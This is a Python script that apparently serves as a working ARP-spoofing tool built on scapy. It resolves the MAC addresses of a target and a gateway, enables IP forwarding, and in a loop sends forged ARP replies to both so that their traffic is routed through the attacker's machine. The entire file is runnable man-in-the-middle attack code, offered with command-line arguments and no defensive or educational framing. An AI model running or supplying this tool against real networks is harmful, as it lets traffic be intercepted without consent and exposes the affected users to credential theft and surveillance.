import time
from scapy.all import *
from typing import List
import os
import sys
import threading
import argparse


def get_attacker_mac(interface):
    try:
        return get_if_hwaddr(interface)
    except:
        return None


def get_mac_from_ip(ip_address: str):
    # dst="ff:ff:ff:ff:ff:ff" broadcasts the request to the whole network
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff")
        / ARP(pdst=ip_address, hwdst="ff:ff:ff:ff:ff:ff"),
        timeout=2,
        verbose=0,
    )
    if ans:
        return ans.hwsrc
    else:
        return None


def resolve_ip(name: str, ip_address: str):
    print(f"Resolving MAC address for {name} {ip_address}")

    # Resolve the target's MAC address
    mac = get_mac_from_ip(ip_address)

    if mac == None:
        print(f"Unable to resolve IP address. Exiting!")
        sys.exit(0)

    print(f"Resolved to {mac}")
    return mac


def arp_spoof(
    interface: str, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str
):
    # Build the packets
    target_packet = Ether(dst=target_mac) / ARP(
        op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
    )
    router_packet = Ether(dst=gateway_mac) / ARP(
        op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip
    )
    while True:
        sendp([target_packet, router_packet], verbose=0, iface=interface)
        # Sleep for 1 second between beacons
        time.sleep(1)

def main(target_ip: str, gateway_ip: str, interface: str):
    # Resolve the MAC addresses
    target_mac = resolve_ip("target", target_ip)
    gateway_mac = resolve_ip("gateway", gateway_ip)
    attacker_mac = get_attacker_mac(interface)

    os.system("sysctl -w net.ipv4.ip_forward=1")

    # Loop forever and beacon packets
    try:
        arp_spoof_thread = threading.Thread(
            target=arp_spoof,
            args=(interface, target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        )
        arp_spoof_thread.start()
        arp_spoof_thread.join()
    except KeyboardInterrupt:
        os.system("sysctl -w net.ipv4.ip_forward=0")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    parser.add_argument(
        "-i",
        "--interface",
        dest="interface",
        help="Name of network interface",
        default="enp0s31f6",
    )
    args = parser.parse_args()
    main(args.target, args.gateway, args.interface)
